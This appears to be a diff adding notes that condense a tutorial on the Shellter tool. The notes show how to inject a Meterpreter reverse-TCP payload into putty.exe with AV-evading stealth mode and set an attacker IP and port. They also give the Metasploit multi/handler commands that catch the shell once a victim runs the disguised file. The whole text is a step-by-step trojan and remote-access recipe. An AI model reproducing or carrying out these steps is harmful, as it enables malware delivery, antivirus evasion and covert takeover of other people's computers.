@@ -1,0 +1,35 @@
+https://www.hackingarticles.in/shellter-a-shellcode-injecting-tool/
+
+Shellter is an active shellcode insertion tool. It effectively re-encodes payloads (here shellcode) to bypass anti-virus (AV) software.
+
+apt-get install shellter
+apt-get install wine32
+---------------------------------------------------------------------------------------
+When you open Shellter in Kali in wine mode, it prompts you to choose operation mode.
+Select the mode as ‘a’. It stands for auto. 
+Now, you need to choose an executable file and copy it to the Shellter folder. This is required to be done to bind Shellter with a .exe file. In our case, we have copied the putty.exe file to the Shellter folder
+and bound it with the shellter.exe file.
+When asked for PE Target, type the following command:
+
+/root/Downloads/putty.exe
+Press the Enter key to continue. You may see DisASM.dll file gets successfully created. Enable Stealth Mode. Then, you are prompted to enable stealth mode.
+Type ‘y’ for yes.
+----------------------------------------------------------------------------------
+Type ‘L’ to use from the listed payload.
+ou can select payload of your choice. In our case, we have selected 1 for Meterpreter_Reverse_TCP
+ set LHOST and LPORT
+In our case, we have set LHOST 192.168.1.109 [Attacker IP] LPORT as 4444
+
+Send PuTTY.exe File to Victim’s Machine
+----------------------------------------------------------------------------------------------------
+Run Exploit
+
+In a new terminal type msfconsole to launch Metasploit framework and execute the following command
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost <IP>
+set lport <port-no.>
+exploit
+
+When the victim clicks the putty.exe file which will appear as similar to original putty.exe and hence the victim will get trapped and we will get a meterpreter session.
